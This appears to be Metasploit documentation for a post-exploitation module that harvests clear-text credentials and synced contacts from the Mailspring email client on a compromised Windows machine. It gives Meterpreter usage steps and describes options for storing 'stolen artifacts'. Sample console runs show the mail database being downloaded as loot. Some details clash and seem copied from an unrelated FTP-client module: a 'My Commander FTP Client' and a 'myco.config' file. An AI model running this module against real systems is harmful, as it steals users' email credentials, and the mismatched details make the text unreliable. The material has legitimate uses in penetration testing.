## Vulnerable Application

This post-exploitation module extracts clear text credentials from the Mailspring Client.

The My Commander FTP Client is avaialble from (https://www.getmailspring.com/).

This module extracts information from the myco.config file in the "AppData\Roaming\Mailspring" directory.

This module extracts sunced contacts.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/mailspring
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.


### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### Mailspring Email Client v1.13.3 on Windows 10 Home 10.0.19045 N/A Build 19045 Default
```
msf6 post(windows/gather/credentials/mailspring) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Mailspring's Edgehill.db file found
[*] Downloading C:\Users\test\AppData\Roaming\Mailspring\edgehill.db
[*] Mailspring Edgehill.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510172752_default_10.0.0.2_Mailspringedgehi_920338.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510172754_default_10.0.0.2_EXTRACTIONSedgeh_471482.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```

### Mailspring Email Client v1.13.3 on Windows 10 Home 10.0.19045 N/A Build 19045 Verbose
```
msf6 post(windows/gather/credentials/mailspring) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Mailspring's base folder not found in users's user directory

[*] Starting Packrat...
[*] Mailspring's base folder found
[*] Found the folder containing specified artifact for edgehill.db.
[*] Mailspring's Edgehill.db file found
[*] Processing C:\Users\test\AppData\Roaming\Mailspring
[*] Downloading C:\Users\test\AppData\Roaming\Mailspring\edgehill.db
[*] Mailspring Edgehill.db downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240510172819_default_10.0.0.2_Mailspringedgehi_192292.db

[+] File with data saved:  /home/kali/.msf4/loot/20240510172821_default_10.0.0.2_EXTRACTIONSedgeh_731344.db
[*] PackRat credential sweep Completed
[*] Post module execution completed
```
